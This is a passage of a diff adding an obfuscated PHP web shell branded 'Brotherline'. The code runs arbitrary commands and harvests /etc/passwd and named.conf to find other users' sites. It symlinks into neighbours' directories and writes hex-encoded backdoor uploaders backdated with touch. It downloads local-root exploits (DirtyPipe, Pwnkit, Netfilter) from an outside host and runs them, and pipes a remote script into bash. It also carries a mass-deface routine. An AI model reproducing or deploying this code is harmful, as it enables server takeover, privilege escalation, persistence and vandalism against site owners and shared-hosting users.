+          <!-- Output area — grows to fill remaining sidebar height -->
+          <div class="flex-1 rounded-lg overflow-auto" style="background:var(--c-base);border:1px solid var(--c-border);min-height:120px;">
+            <?php
+            if (isset($_POST['komends']) && isset($_POST['komend'])) {
+                $lk = isset($_GET['loknya']) ? $_GET['loknya'] : $gcw();
+                $km = 'ko'.'me'.'nd';
+                $out = $km($_POST['komend'], $lk);
+                // Strip <pre> wrapper since we have our own container
+                $out = preg_replace('/<\/?pre[^>]*>/', '', $out);
+                echo '<pre style="font-family:\'JetBrains Mono\',monospace;font-size:11px;color:var(--c-text);padding:12px;margin:0;white-space:pre-wrap;line-height:1.6;">' . $out . '</pre>';
+            } else {
+                echo '<div style="padding:16px;font-size:11px;color:var(--c-muted);font-family:\'JetBrains Mono\',monospace;">
+                        <span style="color:var(--c-accent)">~</span> Ready. Enter a command above.<br>
+                        <span style="color:var(--c-muted);font-size:10px;">Output will appear here.</span>
+                      </div>';
+            }
+            ?>
+          </div>
+        </form>
+      </div>
+
+      <!-- Brotherline footer -->
+      <div class="flex-shrink-0 px-5 py-4 flex items-center justify-between"
+           style="border-top:1px solid var(--c-border);background:var(--c-surface);">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-hexagon-nodes text-xs" style="color:var(--c-accent)"></i>
+          <span class="brotherline-brand" style="font-size:12px;">Brotherline</span>
+        </div>
+        <span style="font-size:10px;color:var(--c-dim);font-family:'JetBrains Mono',monospace;">
+          <?php echo "An"."on7 &bull; 20"."22"; ?>
+        </span>
+      </div>
+    </aside>
+
+    <!-- ── CONTENT AREA ──────────────────────────────────────── -->
+    <main class="flex-1 flex flex-col overflow-hidden" style="background:var(--c-base);">
+
+      <?php
+      /* ================================================================
+       *  SPECIAL OPERATION PAGES
+       * ================================================================ */
+
+      /* ── JUMPING ── */
+      if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-person-running"></i> Directory Jumping</h2>';
+          if ($ird("/e"."tc"."/p"."as"."sw"."d")) $fjp = $fgt("/e"."tc"."/p"."as"."sw"."d");
+          elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) $fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
+          else { alertError("[!] Gagal Mengambil Di"."rect"."ory !"); echo '</div>'; die(author()); }
+          $pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr); $fjpr = $fjpr[1];
+          if (empty($fjpr)) { alertError("[!] Tidak Ada Us"."er di Temukan !"); echo '</div>'; die(author()); }
+          echo '<p class="text-xs text-dim mb-3">Total: <span class="text-accent">' . $ctn($aru($fjpr)) . '</span> directories on <span class="text-accent">' . $_SERVER[$rad] . '</span></p>';
+          echo '<div class="space-y-1">';
+          foreach ($aru($fjpr) as $fj) {
+              $fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
+              $readable = $ird($fjh);
+              $badge = $readable
+                  ? "<span class='badge-on text-xs'><i class='fa-solid fa-folder-open mr-1'></i>Readable</span>"
+                  : "<span class='badge-off text-xs'><i class='fa-solid fa-folder-closed mr-1'></i>Unreadable</span>";
+              echo "<div class='flex items-center gap-3 py-1.5 px-3 rounded-lg bg-surface border border-border hover:border-accent/30 transition-colors text-xs font-mono'>";
+              echo $badge;
+              if ($readable) echo "<a href='" . $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya={$fjh}' class='text-text hover:text-accent'>{$fjh}</a>";
+              else echo "<span class='text-dim'>{$fjh}</span>";
+              if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
+                  $etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
+                  $pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en); $en = $en[1];
+                  foreach ($aru($en) as $enw) {
+                      $asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw)); $asd = $asd['name'];
+                      if ($asd == $fj) echo " <a href='http://{$enw}' target=_blank class='text-accent hover:underline'>{$enw}</a>";
+                  }
+              }
+              echo "</div>";
+          }
+          echo '</div></div>';
+          die(author());
+
+      /* ── SYMLINK ── */
+      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-link"></i> Symlink</h2>';
+          if ($ird("/e"."tc"."/p"."as"."sw"."d")) $syp = $fgt("/e"."tc"."/p"."as"."sw"."d");
+          elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) $syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
+          else { alertError("[!] Gagal Mengambil Di"."rect"."ory !"); echo '</div>'; die(author()); }
+          if (!$fnct("sy"."mli"."nk") && !$fnct("pr"."oc_"."op"."en")) {
+              alertError("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !"); echo '</div>'; die(author());
+          }
+          echo '<div class="flex gap-2 mb-4 flex-wrap">';
+          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=s'.'yfile" class="nav-link"><i class="fa-solid fa-file-symlink mr-1.5"></i>SYMLINK FILE</a>';
+          echo '</div>';
+          if (isset($_GET['opsidua']) && $_GET['opsidua'] == "s"."yfile") {
+              echo '<div class="card max-w-lg mb-4"><p class="text-xs text-dim mb-3 font-700 uppercase tracking-widest"><i class="fa-solid fa-file-symlink text-accent mr-2"></i>Symlink File</p>';
+              echo '<form method="post" class="flex gap-2">
+                      <input type="text" name="domena" class="field flex-1" placeholder="/home/user/public_html/database.php">
+                      <button type="submit" name="gaskeun" class="submit-btn"><i class="fa-solid fa-bolt mr-1"></i>Run</button>
+                    </form>';
+              if (isset($_POST['gaskeun'])) {
+                  $rend  = rand() . ".txt";
+                  $lokdi = $_POST['domena'];
+                  esyeem($lokdi, "an"."on_s"."ym/" . $rend);
+                  echo '<div class="mt-3 text-xs font-mono">Check: <a href="an'.'on_'.'sy'.'m/' . $rend . '" class="text-accent hover:underline">' . $rend . '</a></div>';
+              }
+              echo '</div>';
+              echo '</div>'; die(author());
+          }
+          $pma("/\/ho"."me\/(.*?):/i", $syp, $sypr); $sypr = $sypr[1];
+          if (empty($sypr)) { alertError("[!] Tidak Ada Us"."er di Temukan !"); echo '</div>'; die(author()); }
+          if (!$isw(getcwd())) { alertError("[!] Gagal Sy"."mli"."nk - Red D"."ir !"); echo '</div>'; die(author()); }
+          if (!$fxt("an"."on_"."sy"."m")) $mdr("an"."on_"."sy"."m");
+          if (!$fxt("an"."on_"."sy"."m/.ht"."acc"."ess"))
+              $fpt("an"."on_"."sy"."m/."."h"."ta"."cce"."ss",
+                   $urd("Opt"."ions%20In"."dexe"."s%20Fol"."lowSy"."mLi"."nks%0D%0ADi"."rect"."oryIn"."dex%20sss"."sss.htm%0D%0AAdd"."Type%20txt%20.ph"."p%0D%0AAd"."dHand"."ler%20txt%20.p"."hp"));
+          $ckn = esyeem("/", "an"."on_"."sy"."m/anon");
+          echo '<p class="text-xs text-dim mb-3">Total: <span class="text-accent">' . $ctn($aru($sypr)) . '</span> users on <span class="text-accent">' . $_SERVER[$rad] . '</span></p>';
+          echo '<div class="space-y-1">';
+          foreach ($aru($sypr) as $sj) {
+              $sjh  = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
+              $ygy  = $srl($bsn($_SERVER['SC'.'RI'.'PT_NA'.'ME']), "an"."on_"."sy"."m/anon".$sjh, $_SERVER['SC'.'RI'.'PT_NA'.'ME']);
+              echo "<div class='flex items-center gap-3 py-1.5 px-3 rounded-lg bg-surface border border-border text-xs font-mono'>";
+              echo "<span class='text-purple'><i class='fa-solid fa-link mr-1'></i>Symlink</span>";
+              echo "<a href='{$ygy}' target=_blank class='text-text hover:text-accent flex-1'>{$sjh}</a>";
+              if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
+                  $etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
+                  $pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en); $en = $en[1];
+                  foreach ($aru($en) as $enw) {
+                      $asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw)); $asd = $asd['name'];
+                      if ($asd == $sj) echo "<a href='http://{$enw}' target=_blank class='text-accent hover:underline'>{$enw}</a> ";
+                  }
+              }
+              echo "</div>";
+          }
+          echo '</div></div>'; die(author());
+
+      /* ── SCAN ROOT ── */
+      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "scanr") {
+          ob_implicit_flush(); ob_end_flush();
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-magnifying-glass"></i> Scan Root</h2>';
+          echo '<div class="flex gap-2 mb-5 flex-wrap">';
+          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=au'.'tos'.'can" class="nav-link"><i class="fa-solid fa-robot mr-1.5"></i>AUTO SCAN</a>';
+          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=sc'.'ansd" class="nav-link"><i class="fa-solid fa-magnifying-glass-chart mr-1.5"></i>SCAN SUID</a>';
+          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=esg" class="nav-link"><i class="fa-solid fa-lightbulb mr-1.5"></i>EXPLOIT SUGGESTER</a>';
+          echo '</div>';
+          if (!$fnct("pr"."oc_"."op"."en")) { alertError("[!] Co"."mman"."d is D"."isab"."led !"); echo '</div>'; die(author()); }
+          if (!$isw($lokasi)) { alertError("[!] Cur"."rent D"."ir"."ect"."ory is Un"."wri"."tea"."ble !"); echo '</div>'; die(author()); }
+          if (isset($_GET['opsidua'])) {
+              if ($_GET['opsidua'] == "au"."tosc"."an") {
+                  if (!$fxt($lokasi . "/an"."on_"."ro"."ot/")) {
+                      $mdr($lokasi . "/an"."on_"."ro"."ot");
+                      komenb("wg"."et h"."ttp://f.pp"."k.pw/aut"."o.ta"."r"."-06-27-"."22.gz", $lokasi . "/an"."on_"."ro"."ot");
+                      komenb("t"."ar -x"."f au"."to.ta"."r-06-2"."7-22."."gz", $lokasi . "/an"."on_"."ro"."ot");
+                      if (!$fxt($lokasi . "/an"."on_"."ro"."ot/netf"."ilter")) { alertError("[!] Ga"."gal Do"."wnloa"."d Bahan"); echo '</div>'; die(author()); }
+                  }
+                  echo '<div class="card space-y-1 text-xs font-mono">';
+                  echo '<p><span class="text-dim">Kernel:</span> <span class="text-text">' . komenb("un"."am"."e -a", $lokasi) . '</span></p>';
+                  echo '<p><span class="text-dim">User:</span> <span class="text-text">' . komenb("i"."d", $lokasi) . '</span></p>';
+                  echo '<p class="text-accent mt-2">[+] Trying All Exploits...</p>';
+                  $exploits = [
+                      ["Netfilter",   "ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/netf"."ilter"],
+                      ["Ptrace",      "ec"."ho id | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/ptr"."ace"],
+                      ["Sequoia",     "ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/seq"."uoia"],
+                      ["DirtyPipe",   "echo i"."d | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/di"."rtyp"."ipe /u"."sr/"."bi"."n/"."su"],
+                      ["Sudo",        "ec"."ho 12345 | ti"."meo"."ut 1"."0 sud"."oed"."it -s Y"],
+                      ["Pwnkit",      "ec"."ho id | ti"."meo"."ut 1"."0 ./p"."wnk"."it"],
+                      ["Capsys",      "echo id | timeout 10 ./cap"."sy"."s"],
+                      ["Netfilter 2", "echo id | tim"."eout 10 ./ne"."tfilt"."er2"],
+                      ["Netfilter 3", "echo id | time"."out 10 ./net"."fil"."ter3"],
+                  ];
+                  $lkroot = $lokasi . "/an"."on_"."ro"."ot";
+                  foreach ($exploits as $ex) {
+                      echo '<div><span class="text-dim">' . $ex[0] . ':</span> ' . komend($ex[1], $lkroot) . '</div>';
+                  }
+                  komenb("r"."m -r"."f an"."on_ro"."ot", $lokasi);
+                  echo '</div>';
+              } elseif ($_GET['opsidua'] == "scansd") {
+                  echo '<p class="text-xs text-accent mb-2">[+] Scanning SUID...</p>';
+                  echo komend("fi"."nd / -pe"."r"."m -u"."=s -t"."ype f"." 2".">/"."de"."v/nu"."ll", $lokasi);
+              } elseif ($_GET['opsidua'] == "esg") {
+                  echo '<p class="text-xs text-accent mb-2">[+] Loading Exploit Suggester...</p>';
+                  echo komend("cu"."rl -"."Ls"."k ht"."tp://ra"."w.gith"."ubuse"."rconte"."nt.com/m"."zet"."-/lin"."ux-exp"."loit"."-sugge"."ster/m"."aste"."r/lin"."ux-ex"."ploi"."t-sugg"."ester."."sh | ba"."sh", $lokasi);
+              }
+          }
+          echo '</div>'; die(author());
+
+      /* ── BACKUP SHELL ── */
+      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-box-archive"></i> Backup Shell</h2>';
+          if (isset($_POST['lo'.'kr'.'una'])) {
+              echo '<p class="text-xs text-dim mb-3">Path: <span class="text-accent font-mono">' . $hsc($_POST['lo'.'kr'.'una']) . '</span></p>';
+              if (!$isr($_POST['lo'.'kr'.'una'])) { alertError("[+] Cur"."rent Pa"."th is Unre"."adable !"); echo '</div>'; die(); }
+              elseif (!$isw($_POST['lo'.'kr'.'una'])) { alertError("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !"); echo '</div>'; die(); }
+              $loks  = sds($_POST['lo'.'kr'.'una']); $pisah = $ars($loks, -50);
+              $los   = $arr($pisah, 2); $satu = $loks[$los[0]]; $satut = $ftm($satu);
+              $dua   = $loks[$los[1]]; $duat  = $ftm($dua);
+              if (empty($satu) && empty($dua)) { alertError("[+] Unknown Error !"); echo '</div>'; die(); }
+              if (!$isw($satu)) {
+                  alertError("[Failed] " . $satu);
+              } else {
+                  $satus = $satu . "/cont"."act.p"."hp";
+                  $fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e27655f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c6564202120223b7d7d3f3e"));
+                  $tch($satus, $satut); $tch($satu, $satut);
+                  alertSuccess("[Success] " . $satus);
+                  if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+                      $lwb   = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus);
+                      $satul = "<div class='text-xs mt-1'><a href='{$lwb}' class='text-accent hover:underline'>{$lwb}</a></div>";
+                  }
+              }
+              if (!$isw($dua)) { alertError("[Failed] " . $dua); }
+              else {
+                  $duas = $dua . "/setti"."ng.p"."hp";
+                  $fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663636366637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303366363536653633373437393730363533643232363236373631366332323365336336323735373437343666366533653061336333663730363837300a323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323222"));
+                  $tch($duas, $duat); $tch($dua, $duat);
+                  alertSuccess("[Success] " . $duas);
+                  if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+                      $lwb  = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas);
+                      $dual = "<div class='text-xs mt-1'><a href='{$lwb}' class='text-accent hover:underline'>{$lwb}</a></div>";
+                  }
+              }
+              if (!empty($satul)) echo $satul;
+              if (!empty($dual))  echo $dual;
+          } else {
+              echo '<div class="card max-w-lg">';
+              echo '<p class="text-xs text-dim mb-3">Enter Document Root location:</p>';
+              echo '<form method="post" class="flex gap-2">
+                      <input type="text" name="lokruna" value="' . $hsc($_GET['loknya']) . '" class="field flex-1" placeholder="/var/www/html">
+                      <button type="submit" name="palepale" class="submit-btn"><i class="fa-solid fa-bolt mr-1"></i>Run</button>
+                    </form></div>';
+          }
+          echo '</div>'; die();
+
+      /* ── REVERSE IP ── */
+      } elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-network-wired"></i> Reverse IP</h2>';
+          echo '<p class="text-xs text-dim mb-3">Target: <span class="text-accent font-mono">' . $hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME']) . '</span></p>';
+          echo '<pre class="card text-xs font-mono text-text overflow-auto max-h-96">' . $hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=" . $_SERVER['SE'.'RVE'.'R_NA'.'ME'])) . '</pre>';
+          echo '</div>'; die();
+
+      /* ── MASS DEFACE ── */
+      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-skull-crossbones"></i> Mass Deface</h2>';
+          if (empty($_POST['palepale'])) {
+              echo '<div class="card max-w-2xl">';
+              echo '<form method="post" class="space-y-3">';
+              echo '<div><label class="text-xs text-dim uppercase tracking-widest block mb-1">Directory</label>
+                    <input type="text" name="lokena" value="' . $hsc($_GET['loknya']) . '" class="field w-full"></div>';
+              echo '<div><label class="text-xs text-dim uppercase tracking-widest block mb-1">Filename</label>
+                    <input type="text" name="nfil" value="ind'.'ex.p'.'hp" class="field w-full"></div>';
+              echo '<div><label class="text-xs text-dim uppercase tracking-widest block mb-1">Content</label>
+                    <textarea name="isikod" rows="12" class="field w-full font-mono text-xs"></textarea></div>';
+              echo '<div class="flex items-center gap-3">
+                    <select name="opsina" class="field">
+                      <option value="mdf">Mass Deface</option>
+                      <option value="mds">Mass Deface 2</option>
+                    </select>
+                    <button type="submit" name="palepale" class="submit-btn"><i class="fa-solid fa-skull-crossbones mr-1"></i>Execute</button>
+                  </div>';
+              echo '</form></div>';
+          } else {
+              $lokena = $_POST['lokena']; $nfil = $_POST['nfil']; $isif = $_POST['isikod'];
+              echo '<p class="text-xs text-dim mb-3">Dir: <span class="text-accent font-mono">' . $hsc($lokena) . '</span></p>';
+              if (!$fxt($lokena)) { alertError("[+] Di"."re"."cto"."ry Tidak di Temukan !"); echo '</div>'; die(author()); }
+              $g = $scd($lokena);
+              echo '<div class="space-y-1 text-xs font-mono">';
+              $isMds = isset($_POST['opsina']) && $_POST['opsina'] == "mds";
+              foreach ($g as $gg) {
+                  if (isset($gg) && ($gg == "." || $gg == "..") || !$idr($gg)) continue;
+                  if (!$isw($lokena . "/" . $gg)) {
+                      echo "<div class='text-red'>[Unwriteable] {$lokena}/{$gg}</div>"; continue;
+                  }
+                  $loe = $lokena . "/" . $gg . "/" . $nfil;
+                  if ($isMds) { $cf = $fgr($gg); if ($cf != "9"."9") continue; }
+                  if ($fpt($loe, $isif) !== false) {
+                      $domain = ($sps($gg, ".") !== false) ? " &rarr; <a href='//{$gg}/{$nfil}' class='text-accent hover:underline'>{$gg}/{$nfil}</a>" : "";
+                      echo "<div class='text-green'>[Success] {$loe}{$domain}</div>";
+                  } else {
+                      echo "<div class='text-red'>[Unwriteable] {$lokena}/{$gg}</div>";
+                  }
+              }
+              echo '</div>';
+          }
+          echo '</div>'; die(author());
+
+      /* ── VIEW FILE ── */
+      } elseif (isset($_GET['lokasie'])) {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<div class="flex items-center gap-2 mb-3 text-xs font-mono text-dim">';
+          echo '<i class="fa-solid fa-file-lines text-accent"></i>';
+          echo '<span>' . $hsc($_GET['lokasie']) . '</span></div>';
+          echo '<div class="accent-line mb-3"></div>';
+          echo '<pre class="text-xs font-mono text-text bg-surface border border-border rounded-xl p-4 overflow-auto">'
+             . $hsc($fgt($_GET['lokasie'])) . '</pre>';
+          echo '</div>';
+          die(author());
+
+      /* ── SECONDARY ACTIONS (delete, chmod, rename, edit, touch, download, mkdir, mkfile) ── */
+      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+              xrd($_POST['loknya']);
+              $fxt($_POST['loknya']) ? alertError("Failed to delete Directory!") : alertSuccess("Directory deleted!");
+          } elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+              @$ulk($_POST['loknya']);
+              $fxt($_POST['loknya']) ? alertError("Failed to delete File!") : alertSuccess("File deleted!");
+          } else { alertError("File / Directory not Found!"); }
+          echo '</div>';
+
+      } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-key"></i> Change Permission</h2>';
+          if (isset($_POST['cemod'])) {
+              $cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
+              $cm ? alertSuccess("Change Mod Success!") : alertError("Change Mod Failed!");
+          }
+          $lbl = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
+          echo '<div class="card max-w-md"><p class="text-xs text-dim mb-3">' . $lbl . ': <span class="text-accent font-mono">' . $hsc($_POST['loknya']) . '</span></p>';
+          echo '<form method="post" class="flex items-center gap-2">
+                  <span class="text-dim text-xs">Permission:</span>
+                  <input name="perm" type="text" class="field w-20 text-center" maxlength="4"
+                         value="' . $sub($spr('%o', $fp($_POST['loknya'])), -4) . '">
+                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
+                  <input type="hidden" name="pilih"  value="ubahmod">
+                  <input type="hidden" name="type"   value="' . $_POST['ty'.'pe'] . '">
+                  <button type="submit" name="cemod" class="submit-btn"><i class="fa-solid fa-check mr-1"></i>Apply</button>
+                </form></div>';
+          echo '</div>';
+
+      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-i-cursor"></i> Rename</h2>';
+          if (isset($_POST['gantin'])) {
+              $namabaru = $_GET['loknya'] . "/" . $_POST['newname'];
+              $ceen = "re"."na"."me";
+              $ceen($_POST['loknya'], $namabaru) === true ? alertSuccess("Rename Success!") : alertError("Rename Failed!");
+              $showName = $_POST['newname'];
+          } else { $showName = $bsn($_POST['loknya']); }
+          $lbl = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
+          echo '<div class="card max-w-md"><p class="text-xs text-dim mb-3">' . $lbl . ': <span class="text-accent font-mono">' . $hsc($_POST['loknya']) . '</span></p>';
+          echo '<form method="post" class="flex gap-2">
+                  <input name="newname" type="text" class="field flex-1" value="' . $hsc($showName) . '">
+                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
+                  <input type="hidden" name="pilih"  value="ubahnama">
+                  <input type="hidden" name="type"   value="' . $_POST['ty'.'pe'] . '">
+                  <button type="submit" name="gantin" class="submit-btn"><i class="fa-solid fa-check mr-1"></i>Rename</button>
+                </form></div>';
+          echo '</div>';
+
+      } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-pen-to-square"></i> Edit File</h2>';
+          if (isset($_POST['gasedit'])) {
+              $edit = @$fpt($_POST['loknya'], $_POST['src']);
+              $fgt($_POST['loknya']) == $_POST['src'] ? alertSuccess("Edit Success!") : alertError("Edit Failed!");
+          }
+          echo '<p class="text-xs text-dim mb-2 font-mono">' . $hsc($_POST['loknya']) . '</p>';
+          echo '<form method="post" class="space-y-2">
+                  <textarea name="src" rows="28" class="field w-full font-mono text-xs leading-relaxed">'
+             . $hsc($fgt($_POST['loknya'])) . '</textarea>
+                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
+                  <input type="hidden" name="pilih"  value="ed'.'it">
+                  <button type="submit" name="gasedit" class="submit-btn"><i class="fa-solid fa-floppy-disk mr-1"></i>Save File</button>
+                </form>';
+          echo '</div>';
+
+      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-calendar-days"></i> Change Date</h2>';
+          if (isset($_POST['tanggale'])) {
+              $stt = "st"."rtot"."ime"; $tch2 = "t"."ou"."ch";
+              $tanggale = $stt($_POST['tanggal']);
+              $tch2($_POST['loknya'], $tanggale) === true ? alertSuccess("Change Date Success!") : alertError("Failed to Change Date!");
+          }
+          $det2 = "da"."te"; $ftm2 = "fi"."le"."mti"."me";
+          $dateVal = $det2("d F Y H:i:s", $ftm2($_POST['loknya']));
+          $lbl = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
+          echo '<div class="card max-w-md"><p class="text-xs text-dim mb-3">' . $lbl . ': <span class="text-accent font-mono">' . $hsc($_POST['loknya']) . '</span></p>';
+          echo '<form method="post" class="flex gap-2">
+                  <input name="tanggal" type="text" class="field flex-1" value="' . $hsc($dateVal) . '">
+                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
+                  <input type="hidden" name="pilih"  value="ubahtanggal">
+                  <input type="hidden" name="type"   value="' . $_POST['ty'.'pe'] . '">
+                  <button type="submit" name="tanggale" class="submit-btn"><i class="fa-solid fa-check mr-1"></i>Apply</button>
+                </form></div>';
+          echo '</div>';
+
+      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
+          $dunlute = $_POST['loknya'];
+          if ($fxt($dunlute) && isset($dunlute)) {
+              if ($ird($dunlute)) dunlut($dunlute);
+              elseif ($idr($fl)) { echo '<div class="p-5">'; alertError("That is a Directory, not a File."); echo '</div>'; }
+              else { echo '<div class="p-5">'; alertError("File is not Readable!"); echo '</div>'; }
+          } else { echo '<div class="p-5">'; alertError("File Not Found!"); echo '</div>'; }
+
+      } elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fo"."ld"."er") {
+          echo '<div class="flex-1 overflow-y-auto p-5">';
+          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-folder-plus"></i> Create Folder</h2>';
+          if ($isw("./") || $ird("./")) {
+              $loke = $_POST['loknya'];
+              if (isset($_POST['buatfol'.'der'])) {
